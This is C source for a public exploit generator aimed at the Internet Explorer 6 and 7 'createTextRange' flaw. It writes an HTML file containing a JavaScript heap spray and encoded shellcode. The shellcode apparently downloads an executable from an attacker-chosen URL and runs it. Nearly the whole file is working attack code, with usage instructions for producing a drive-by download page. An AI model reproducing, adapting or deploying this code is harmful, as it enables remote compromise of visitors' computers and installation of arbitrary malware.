/*
*
* Internet Explorer "createTextRang" Download Shellcoded Exploit (2)
* Bug discovered by Computer Terrorism (UK)
* http://www.computerterrorism.com/research/ct22-03-2006
*
* Affected Software: Microsoft Internet Explorer 6.x & 7 Beta 2
* Severity: Critical
* Impact: Remote System Access
* Solution Status: Unpatched
*
* E-Mail: atmaca@icqmail.com
* Web: http://www.spyinstructors.com,http://www.atmacasoft.com
* Credit to Kozan,SkyLined,delikon,Darkeagle,Stelian Ene
*
*/

/*
*
* This one is more faster than all released createTextRange exploits
* because it uses last version of SkyLined's heap spraying code,
* special 10x goes to him.
*
*/

#include <windows.h>
#include <stdio.h>

#define BUF_LEN         0x800
#define FILE_NAME       "index.htm"

char body1[] =
	"<input type=\"checkbox\" id=\"blah\">\r\n"
	"<SCRIPT language=\"javascript\">\r\n\r\n"
	"\tvar heapSprayToAddress = 0x3c0974c2;\r\n\r\n"
	"\tvar payLoadCode = unescape(\"%u9090%u9090%u9090\" +\r\n"
	"\t\"%uCCE9%u0000%u5F00%u56E8%u0000%u8900%u50C3%u8E68%u0E4E%uE8EC\" +\r\n"
	"\t\"%u0060%u0000%uC931%uB966%u6E6F%u6851%u7275%u6D6C%uFF54%u50D0\" +\r\n"
	"\t\"%u3668%u2F1A%uE870%u0046%u0000%uC931%u5151%u378D%u8D56%u0877\" +\r\n"
	"\t\"%u5156%uD0FF%u6853%uFE98%u0E8A%u2DE8%u0000%u5100%uFF57%u31D0\" +\r\n"
	"\t\"%u49C9%u9090%u6853%uD87E%u73E2%u19E8%u0000%uFF00%u55D0%u6456\" +\r\n"
	"\t\"%u30A1%u0000%u8B00%u0C40%u708B%uAD1C%u688B%u8908%u5EE8%uC35D\" +\r\n"
	"\t\"%u5553%u5756%u6C8B%u1824%u458B%u8B3C%u0554%u0178%u8BEA%u184A\" +\r\n"
	"\t\"%u5A8B%u0120%uE3EB%u4935%u348B%u018B%u31EE%uFCFF%uC031%u38AC\" +\r\n"
	"\t\"%u74E0%uC107%u0DCF%uC701%uF2EB%u7C3B%u1424%uE175%u5A8B%u0124\" +\r\n"
	"\t\"%u66EB%u0C8B%u8B4B%u1C5A%uEB01%u048B%u018B%uE9E8%u0002%u0000\" +\r\n"
	"\t\"%uC031%uEA89%u5E5F%u5B5D%uE8C3%uFF2F%uFFFF%u686D%u2E68%u7865\" +\r\n"
	"\t\"%u0065";

char body2[] =
	"\r\n\r\n\tvar heapBlockSize = 0x400000;\r\n\r\n"
	"\tvar payLoadSize = payLoadCode.length * 2;\r\n\r\n" 
	"\tvar spraySlideSize = heapBlockSize - (payLoadSize+0x38);\r\n\r\n"
	"\tvar spraySlide = unescape(\"%u9090%u9090\");\r\n" 
	"\tspraySlide = getSpraySlide(spraySlide,spraySlideSize);\r\n\r\n"
	"\theapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\r\n\r\n"
	"\tmemory = new Array();\r\n\r\n"
	"\tfor (i=0;i<heapBlocks;i++)\r\n" 
	"\t{\r\n\t\tmemory[i] = spraySlide + payLoadCode;\r\n\t}\r\n\r\n"
	"\tvar r = document.getElementById('blah').createTextRange();\r\n\r\n"
	"\tfunction getSpraySlide(spraySlide, spraySlideSize)\r\n" 
	"\t{\r\n\t\twhile (spraySlide.length*2<spraySlideSize)\r\n\t\t{\r\n"
	"\t\t\tspraySlide += spraySlide;\r\n\t\t}\r\n"	
	"\t\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\r\n"
	"\t\treturn spraySlide;\r\n"
	"\t}\r\n\r\n</script>";


int main(int argc,char *argv[])
{
        if (argc < 2)
        {
                printf("\nInternet Explorer \"createTextRang\" Download Shellcoded Exploit (2)");
				printf("\nCoded by ATmaCA (atmaca[at]icqmail.com)\n");
                printf("\nUsage:\n");
                printf("ie_exp <WebUrl>\n");

                return 0;
        }

        FILE *File;
        char *pszBuffer;
        char *web = argv[1];
        char *pu = "%u";
        char u_t[5];
        char *utf16 = (char*)malloc(strlen(web)*5);

        if ( (File = fopen(FILE_NAME,"w+b")) == NULL ) {
                printf("\n [Err:] fopen()");
                exit(1);
        }

        pszBuffer = (char*)malloc(BUF_LEN);
        memcpy(pszBuffer,body1,sizeof(body1)-1);

        memset(utf16,'\0',strlen(web)*5);
        for (unsigned int i=0;i<strlen(web);i=i+2)
        {
                sprintf(u_t,"%s%.2x%.2x", pu, web[i+1], web[i]);
                strcat(utf16,u_t);
        }

        strcat(pszBuffer,utf16);
        strcat(pszBuffer,"%u0000\");");
        strcat(pszBuffer,body2);

        fwrite(pszBuffer, BUF_LEN, 1,File);
        fclose(File);

        printf("\n\n"  FILE_NAME  " has been created in the current directory.\n");
        return 1;
}
